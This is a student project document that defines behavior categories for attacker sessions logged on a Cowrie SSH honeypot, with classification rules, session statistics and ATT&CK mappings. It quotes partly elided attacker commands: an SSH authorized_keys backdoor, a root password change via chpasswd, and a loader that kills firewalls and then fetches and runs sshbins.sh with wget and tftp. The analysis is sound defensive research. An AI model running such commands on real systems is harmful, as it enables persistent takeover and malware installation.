# Attacker Types and Behavior Categories

InnoLab 3, Sprint 3. This document defines every class we use to describe what attackers do on the Cowrie SSH honeypot. Each class has a written definition, an executable rule and numbers from our data, as the supervisor requested ("every class you show is clearly defined and documented").

- Rules as code: `category()`, `style()` and `activity()` in `scripts/ml_profiles.py`
- Numbers: `scripts-out/ml/profile_report.md` (re-create with `python scripts/ml_profiles.py`, no database needed)
- Picture: `scripts-out/ml/profile_overview.png`

**Data basis for all numbers below, unless stated otherwise:** the time-based sample of 77,984 Cowrie sessions with typed commands, 2026-02-17 to 2026-03-31, 4,873 source IPs. The full data set has 259,946 such sessions (2026-01-07 to 2026-03-31). Applying the rules to the full data set is planned for Sprint 4.

## 1. Overview: three questions, three levels

| Level | Question | Unit | Classes |
|:---|:---|:---|:---|
| 1. Behavior category | **What** did the session do? | one session | 3 classes without commands, 6 classes with commands plus "Other" |
| 2. Interaction style | **How** were the commands sent? | one session | single command, burst, fast, paced, slow |
| 3. Activity type | **How often** does the source come back? | one source IP | one-day visitor, recurring bot node, low-and-slow, high-volume automation |

Why three levels and not one list of "attacker types": one label cannot answer all three questions. A takeover script is the same behavior whether it arrives once or every day. Keeping the levels apart keeps every rule short and avoids classes that overlap.

Each session gets exactly one category. The rules are checked in the order of section 2.2 and the first match wins.

## 2. Level 1: Behavior categories

### 2.1 Sessions without commands

These sessions never reach a shell or do nothing in it. They are 93% of all Cowrie sessions (3,446,226 of 3,706,172 in the full data set) and all of Heralding and Endlessh.

| Category | Definition | Rule |
|:---|:---|:---|
| Connection scan | Connects and leaves without a login attempt | no `authentication_attempt` event, no command |
| Brute force | Tries credentials and never gets in | at least one `authentication_attempt`, no successful login, no command |
| Login without activity | Logs in successfully and sends no command | successful login, no command |

These three classes are defined here but not yet computed by any script. The counts need one query on the `sessions` table (Sprint 5).

### 2.2 Sessions with commands

| # | Category | Definition (plain words) | Rule (first match wins) | Sessions | Share | IPs |
|---:|:---|:---|:---|---:|---:|---:|
| 1 | Targeted device and data search | Looks for one specific device type or data set | commands contain `/ip cloud print`, `TelegramDesktop`, `/var/spool/sms` or `ttyGSM` | 76 | 0.10% | 47 |
| 2 | Full takeover chain | Installs lasting access and also inspects or changes the system | access change (see below) together with recon or execute | 818 | 1.05% | 447 |
| 3 | SSH key backdoor | Only installs lasting access, nothing else | access change, no recon, no execute | 12,235 | 15.69% | 3,017 |
| 4 | Malware download or execution | Fetches or starts a program | download or execute tag, no access change | 404 | 0.52% | 72 |
| 5 | Login check | Sends one harmless `echo` to test that the login gave a working shell | no intent tag and the first word is `echo` | 39,798 | 51.03% | 18 |
| 6 | System reconnaissance | Only reads information about the system | recon tag, or no tag and the first word is a look-around command (`pwd`, `ls`, `mount`, `env`, `history`, `ssh`, `cat`, `df`, `locate`, `find`, `which`) | 24,616 | 31.57% | 1,481 |
| - | Other / not covered | Nothing above matched | | 37 | 0.05% | 30 |

"Access change" means: the persistence tag of `db_analyzer.py` is set **and** the commands contain `authorized_keys`, `chpasswd`, `passwd`, `useradd` or `adduser`. The second condition is needed because the tag is also set for `crontab -l`, which only lists cron jobs (see section 6).

The six categories cover 99.95% of the sample. The remaining 37 sessions are mostly an aborted key injection (`chattr -ia .ssh ; lockr -ia .ssh` without the key, 31 sessions).

**Background noise or interesting?** The supervisor asked which behavior we treat as noise and which we would flag. Noise: login check, system reconnaissance and SSH key backdoor. They are 98% of the sample, each is a handful of scripts repeated thousands of times, and they stay the same over the whole period. Interesting: the full takeover chain, malware download or execution and the targeted search. They are under 2% of the sample, they change over time, and they show what the attacker wants with the machine. Anything that fits no category is flagged for reading.

### 2.3 The categories in detail

**1. Targeted device and data search**
- Example: `/ip cloud print ; ifconfig ; uname -a ; cat /proc/cpuinfo ; ps | grep ... ; ls -la ~/.local/share/TelegramDesktop/tdata ... /dev/ttyGSM* /var/spool/sms/* ...`
- What it means: `/ip cloud print` is a MikroTik RouterOS command, so the bot checks whether it landed on a router. It then looks for Telegram Desktop session data and SMS modem files.
- Why a separate category: among the families we read, it is the only one that searches for specific data to steal. General recon only fingerprints the machine.
- Style: 10 commands, 0.6 s between commands, libssh client.

**2. Full takeover chain**
- Example: `cd ~ ; chattr -ia .ssh ; lockr -ia .ssh ; cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys ... ; cat /proc/cpuinfo | grep name | wc -l ; echo "root:<new password>"|chpasswd|bash ; rm -rf /tmp/secure.sh ; pkill -9 secure.sh ; echo > /etc/hosts.deny ; ...`
- What it means: installs an SSH key, changes the root password, counts CPUs and memory, and removes competing malware.
- Style: about 20 commands, 1.4 s between commands. 687 of the 818 sessions use 663 different exact command sequences, because the new password is random each time.
- A second, unrelated script falls in the same category: `chmod +x setup.sh ; sh setup.sh ; ... echo "ssh-rsa ..." > ~/.ssh/authorized_keys ; chattr +ai ...` from Go clients (131 sessions).

**3. SSH key backdoor**
- Example: `cd ~ ; chattr -ia .ssh ; lockr -ia .ssh ; cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- What it means: deletes existing SSH keys and installs the attacker's key. Nothing else happens in the session.
- Style: 3 commands in 0.3 s, always the libssh client, 3,017 IPs.
- Known campaign: the key comment `mdrfckr` is attributed to the Outlaw (Dota) botnet in public reports (sources 5 to 7). In the full data set this command was seen 63,977 times from 5,617 IPs.

**4. Malware download or execution**
- Examples: `pkill iptables -9 ; pkill firewalld -9 ; cd /tmp || cd /var/run ... ; wget http://.../sshbins.sh ; chmod 777 sshbins.sh ; sh sshbins.sh ; tftp ... -c get tftp1.sh ; ...` and `chmod +x ./.<random name> ; nohup ./.<random name> <list of IPs> &`
- What it means: a loader script that tries several download tools and architectures, or the start of a file that was uploaded before.
- Style: mixed. Most are one or two long commands from Go clients. 12 sessions are an installer pasted through PuTTY with 26 s between the parts.
- Small but varied: 404 sessions, 25 families. 12 of the 25 families first appear after 6 March, in the last weeks of the sample.

**5. Login check**
- Examples: `echo -e "\x6F\x6B"` (prints "ok"), `echo -n login_success`, `echo OKTEST123`, `echo "<base64>" | base64 -d`
- What it means: the brute-force tool confirms that the password worked and that a real shell answers. Public reports describe the same pattern for Go-based SSH brute-forcers (sources 8 and 9).
- Style: exactly one command, Go client (99%).
- Important for the statistics: 39,798 sessions come from only 18 IPs, and one IP alone sent 32,963. This category is half of the sample but almost no attackers.

**6. System reconnaissance**
- Examples: `uname -s -v -n -r -m`, `uname -a`, `hostname`, and a 5-command script that starts with `export PATH=... ; uname=$(uname -s -v -n -m) ; arch=$(uname -m) ; ...`
- What it means: collects operating system, CPU, memory and uptime. Typical first step before a bot decides what to do with the machine.
- Style: 82% burst (all commands within milliseconds), Go client.
- 244 families, but 207 of them are one bot: a single IP that picks 8 look-around commands from a pool of about 22 in each session, in random order. Every session is a new family, and no two sessions even share the same set of commands.

### 2.4 Link to MITRE ATT&CK

Technique IDs were checked on attack.mitre.org in November 2026. The mapping is for orientation in the final report.

| Category | Techniques |
|:---|:---|
| Brute force, Login check | T1110 Brute Force, T1078.001 Valid Accounts: Default Accounts |
| System reconnaissance, Targeted search | T1082 System Information Discovery |
| SSH key backdoor | T1098.004 SSH Authorized Keys, T1222.002 Linux and Mac File and Directory Permissions Modification (`chattr`), T1070.004 File Deletion |
| Full takeover chain | the same as SSH key backdoor, plus T1098 Account Manipulation (password change) and T1082 |
| Malware download or execution | T1105 Ingress Tool Transfer, T1059.004 Unix Shell, T1562.004 Disable or Modify System Firewall |

## 3. Level 2: Interaction style, and our criterion for "bot or human"

The style is the average time between two commands of a session.

| Style | Rule | Sessions in sample |
|:---|:---|---:|
| Single command | only one command, no gap to measure | 44,337 |
| Burst | under 0.5 s | 31,919 |
| Fast | 0.5 to 2 s | 1,561 |
| Paced | 2 to 5 s | 121 |
| Slow | 5 s or more | 46 |

**Slow does not mean human.** We read all 46 slow sessions of the sample:

| Slow sessions | What they are |
|---:|:---|
| 33 | SSH key backdoor and takeover chain scripts with pauses (libssh client) |
| 12 | The PuTTY installer script with a fixed 22 to 28 s between its four parts |
| 1 | Our own manual test from an Austrian IP (`nano etc/passwwd`, `echo test`) |

**Proposed criterion.** A session is a human candidate only if all four points hold. The criterion is not implemented in a script yet. We applied it by reading the sessions.

1. at least 4 different commands,
2. 5 s or more between commands on average,
3. a correction that a script would not make (a typo followed by the corrected command) or an interactive editor (`nano`, `vi`),
4. no known bot signature and not one of our own IP addresses.

**Result.** Among the sessions we examined (the 46 slow sessions of the sample and the 11 sessions that the analyzer flags in the full data set) there is no session from an outside human attacker. Of the 11 flagged sessions, two come from Austrian addresses and are our own tests, as we already stated in InnoLab 2. The other nine are one recon script from a single IP with 0.3 to 1.3 s between commands. They were flagged because of an error in the typo rule (section 6). The 270 slow sessions of the full data set have not all been read yet. Published studies report the same order of magnitude: 0.09% and 0.10% interactive sessions (sources 2 and 3).

## 4. Level 3: Activity type per source IP

The supervisor suggested the class names scanner, bot, noisy automation and low-and-slow actor. This is how we define them.

| Activity type | Supervisor's term | Rule | IPs | Share of IPs | Share of sessions |
|:---|:---|:---|---:|---:|---:|
| Scanner | scanner | only sessions without commands (section 2.1) | not in the sample | | |
| One-day visitor | bot | command sessions on exactly 1 day | 3,227 | 66.22% | 30.59% |
| Recurring bot node | bot | command sessions on 2 or more days | 1,592 | 32.67% | 12.89% |
| Low-and-slow | low-and-slow actor | active on 8 or more days with at most 5 sessions per active day | 30 | 0.62% | 0.90% |
| High-volume automation | noisy automation | 100 or more command sessions | 24 | 0.49% | 55.61% |

The rules are checked from the bottom of the table upwards: high-volume first, then low-and-slow, then the number of active days. The thresholds (100 sessions, 8 days, 5 per day) are a first proposal for a 43-day sample. They must be checked again on the full data set.

What the IP level shows:

- **24 IPs produce 55.6% of all command sessions.** Counting sessions describes these few sources, counting IPs describes the many.
- **95.3% of the IPs show exactly one behavior category.** Part of this is trivial, because 30% of the IPs appear with a single session. The most common mix is SSH key backdoor together with the full takeover chain (200 IPs). Both use the same `mdrfckr` key, so we read them as two variants of one campaign.
- Recon followed by an attack from the same IP is almost absent (2 IPs). If recon and attack belong together, they come from different IPs, which we cannot link without attribution.

## 5. How this relates to the labels we had before

| Earlier label | Status | Reason |
|:---|:---|:---|
| Intent tags (`recon`, `download`, `execute`, `persistence`, `cleanup_evasion`, ...) | kept as building blocks | The categories are built from them. One session can have many tags but only one category. |
| Intent profile `unclassified` (44% of sessions in the full data set, 52% in the sample) | replaced | Almost all of it is the login check and look-around commands. |
| Archetypes ("Standard Automated Recon", "Monotonous Redundant Looper", ...) | not used any more | They are computed from session metrics version 1, which counts SSH client events as commands. 95% of the 3.57 million sessions counted that way fall into one archetype. |
| Cadence tiers | kept as interaction style | Same thresholds, but "Human Interactive Pace" is renamed to "slow" because the pace alone does not show a human. |
| `attack_type` (automated / human_or_manual / uncertain) | kept in the database, not used for categories | Event-level heuristic with thresholds that were never checked. |
| K-Means clusters 0 to 11 | compared in [clustering_evaluation.md](clustering_evaluation.md) | 10 of 12 clusters correspond to one category. |

## 6. Limits and open points

1. **The categories describe behavior, not people.** The same behavior from many IPs is not proof of one actor. We make no attribution.
2. **Sample only.** The numbers are from six weeks. The rules still have to run on all 259,946 command sessions.
3. **Two errors in the intent tags of `db_analyzer.py`:** `crontab -l` is tagged as persistence and `ls /var/log` as cleanup, although both only read. 137 recon sessions of the sample carry the persistence tag for this reason (in 68 of them `crontab -l` is visible, in 69 the command list is cut before it). `ml_profiles.py` corrects this with the access-change condition. The tags themselves should be fixed.
4. **The human flag of `db_analyzer.py` has a false-positive rule:** if two commands follow each other within 0.4 to 8 s, their first words differ by up to two letters, and the second one is a common command, the pair counts as a typo and its correction. `ssh` followed by `ps`, or `df` followed by `ls`, already match. This flagged nine scripted sessions as human.
5. **Command text in the CSV is cut at 400 characters.** Keyword rules only see the beginning of long sessions. The intent tags are computed on the full commands and are not affected.
6. **No command sessions after 2026-03-31**, although Cowrie logged events until 2026-10-22. The reason has to be checked (Sprint 4). Until then all behavior statements refer to January to March 2026.
7. **Rules are not ground truth.** They are a transparent baseline. Agreement between rules and clusters does not prove that either is correct.

## 7. Sources

1. Recep Balıbey, e-mails of 2026-01-15 and 2026-01-26 and meeting of 2026-10-23 (class names, definition requirement, clustering task).
2. Shamsi et al., "Measuring and Clustering Network Attackers using Medium-Interaction Honeypots", 2022. https://arxiv.org/abs/2206.13614
3. Valeros, Sladić, Garcia, "Ghost Without Shell", 2026. https://arxiv.org/abs/2606.28006
4. MITRE ATT&CK. https://attack.mitre.org/
5. SANS Internet Storm Center diary on the `mdrfckr` key. https://isc.sans.edu/diary/32986
6. Kaspersky Securelist, Outlaw botnet. https://securelist.com/outlaw-botnet/116444/
7. Elastic Security Labs, Outlaw Linux malware. https://www.elastic.co/security-labs/outlaw-linux-malware
8. Write-up of a Go-based SSH botnet that sends `echo -e "\x6F\x6B"`. https://klavansec.substack.com/p/we-mapped-a-live-p2p-botnet-from
9. Flare, "Modern Golang SSH brute force malware". https://flare.io/learn/resources/blog/modern-golang-ssh-brute-force-malware
10. SANS Internet Storm Center diary on `/ip cloud print`. https://isc.sans.edu/diary/23762
